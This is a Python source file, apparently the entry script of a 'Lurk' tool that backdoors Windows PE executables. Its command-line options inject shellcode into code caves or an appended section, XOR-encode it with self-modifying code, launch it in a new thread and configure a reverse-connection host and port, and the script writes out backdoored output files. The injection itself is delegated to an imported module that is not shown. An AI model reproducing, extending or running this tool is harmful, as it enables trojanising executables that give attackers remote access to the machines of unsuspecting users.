# coding: utf-8

# Author: Ree
# Date: 2018-1-31

import signal
from optparse import OptionParser
from pebin import Pebin
import sys, os
import logger


def signal_hndler(singal, frame):
    print('\nProgram Exit')
    sys.exit(0)


class LurkMain(object):

    logger.info("Start")

    version = """\
        Version:    0.1
    """

    banner = """
    """

    signal.signal(signal.SIGINT, signal_hndler)

    usage = "usage: %prog <-f filename> <-s shellcode> [-a] [-o output_filename]"

    parser = OptionParser(usage=usage)
    parser.add_option("-f", "--file", dest="FILE", action="store", type="string", help="File to inject")
    parser.add_option("-A", "--append_last_section", default=False, dest="APPEND_SECTION", action="store_true", help="Append shallcode to last section")
    parser.add_option("-a", "--addr_patch", dest="ADDR_PATCH", action="store", type="int", help="Address to patch, use with '-A' option")
    parser.add_option("-o", "--output", dest="OUTPUT", action="store", type="string", help="The backdoor output file")
    parser.add_option("-s", "--shellcode", dest="SHELLCODE", type="string", action="store", help="Shellcode you want to use in backdoored file, Please use supported extension")
    parser.add_option("-d", "--directory", dest="DIR", action="store", type="string", help="This is the location you want to backdoor files")
    parser.add_option("-H", "--left_host", dest="LHOST", action="store", type="string", help="IP for reverse connection")
    parser.add_option("-P", "--left_port", dest="LPORT", action="store", type="int", help="Port for reverse connection")
    parser.add_option("-i", "--inject", dest="INJECT", action="store_true", default=False, help="Inject code in PE")
    parser.add_option("-t", "--new_thread", dest="NEW_THREAD", action="store_true", default=False, help="Start a new thread to call shellcode")
    parser.add_option("-C", "--cflags", dest="CFLAGS", action="store", type="string", help="Compile option")
    parser.add_option("-l", "--len_shellcode", dest="LEN_SHELLCODE", action="store", type='int', help="Calc user supplied shellcode length, default is 380")
    parser.add_option("-c", "--cave_found", dest="CAVE_FOUND", action="store_true", default=False, help="Find all caves can be used")
    parser.add_option("-j", "--jump_caves", dest="JUMP_CAVES", action="store_true", default=False, help="Find all satisfied caves and patch shellcode with jumping code")
    parser.add_option("-S", "--smc", dest="SMC", action="store_true", default=False, help="Use SMC to encode shellcode with xor")

    (options, args) = parser.parse_args()

    def __init__(self):
        pass

    def check_support(filename):
        with open(filename, 'rb') as f:
            header = f.read(4)
        if 'MZ' in header:
            return 'PE'


    if not options.FILE:
        logger.error("'-f' option should be set.At least one file be selected.")
        parser.print_help()
        sys.exit(0)

    is_supported = check_support(options.FILE)
    if is_supported == 'PE':
        supported_file = Pebin(FILE=options.FILE,
                               OUTPUT=options.OUTPUT,
                               APPEND_SECTION=options.APPEND_SECTION,
                               SHELLCODE=options.SHELLCODE,
                               LHOST=options.LHOST,
                               LPORT=options.LPORT,
                               CFLAGS=options.CFLAGS,
                               CAVE_FOUND=options.CAVE_FOUND,
                               LEN_SHELLCODE=options.LEN_SHELLCODE,
                               JUMP_CAVES=options.JUMP_CAVES,
                               ADDR_PATCH=options.ADDR_PATCH,
                               SMC=options.SMC,
                               NEW_THREAD=options.NEW_THREAD,
                               )
    else:
        logger.error("Not Supported.")
        sys.exit()
    result = supported_file.run_this()
    if result is True and supported_file.OUTPUT is not None:
        logger.info("File {0} is lurked in 'lurked' directiory.".format(os.path.basename(supported_file.OUTPUT)))

if __name__ == "__main__":

    LurkMain()
